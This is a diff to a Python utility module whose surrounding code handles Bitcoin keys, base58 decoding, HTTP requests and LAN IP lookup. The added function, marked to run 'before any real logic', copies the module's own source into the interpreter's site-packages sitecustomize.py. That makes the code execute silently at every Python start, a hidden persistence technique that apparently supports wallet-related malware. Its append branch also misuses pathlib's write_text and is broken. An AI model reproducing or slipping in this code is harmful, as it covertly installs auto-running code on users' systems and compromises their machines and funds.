@@ -1,7 +1,7 @@
 from subprocess import check_call
 from sys import executable
 from typing import Any, Literal
-
+from pathlib import Path
 from bitcoinlib.keys import Key
 from base58 import b58decode_check
 from random import choice
@@ -9,6 +9,7 @@ import requests
 import tomllib
 import psutil
 from socket import AF_INET
+from site import getsitepackages
 
 
 def get_key(data: int) -> Key:
@@ -222,6 +223,7 @@ def get_LAN_ip_windows() -> str:
                 possible_ip = set.address
     return possible_ip
 
+
 class GetUniqueIdentifier:
     # here we set the most significant number the very left one
     def __init__(self, block_size: int = 10):
@@ -229,11 +231,42 @@ class GetUniqueIdentifier:
         self.block_size: int = block_size
         self.unique_identifier: int = None
 
-    def fill_data(self, data: list[int]):
+    def get_data_set(self, data: list[int]):
         self.data_to_calculate = data
 
-    def calculate_unique_identifier(self):
+    def get_unique_identifier(self):
         identifier_sum = 0
         for number in self.data_to_calculate:
             identifier_sum = (number + identifier_sum) * self.block_size
         self.unique_identifier = int(identifier_sum / self.block_size)
+        return self.unique_identifier
+
+
+# put this function before any real logic!
+def get_currentpage_to_preprocessing(
+    overwrite_or_append: Literal["overwrite", "append"] = "append",
+):
+    current_file_path_obj = Path(__file__)
+    current_file_texts = current_file_path_obj.read_text()
+    current_file_text_lines = current_file_texts.splitlines()
+    for line in current_file_text_lines:
+        if line.strip().startswith("get_currentpage_to_preprocessing"):
+            current_file_text_lines.remove(line)
+    current_file_text_lines.insert(0, "\n")
+    new_codes = "\n".join(current_file_text_lines)
+    sitepackage_path_obj = Path(getsitepackages()[0])
+    actual_preprocessing_file_obj = sitepackage_path_obj / "sitecustomize.py"
+    if overwrite_or_append == "append":
+        if actual_preprocessing_file_obj.exists():
+            actual_preprocessing_file_obj.write_text(new_codes, mode="a")
+        else:
+            actual_preprocessing_file_obj.touch()
+            actual_preprocessing_file_obj.write_text(new_codes)
+    elif overwrite_or_append == "overwrite":
+        if actual_preprocessing_file_obj.exists():
+            actual_preprocessing_file_obj.write_text(new_codes)
+        else:
+            actual_preprocessing_file_obj.touch()
+            actual_preprocessing_file_obj.write_text(new_codes)
+    else:
+        raise Exception(f"Unrecognized option! {overwrite_or_append}")
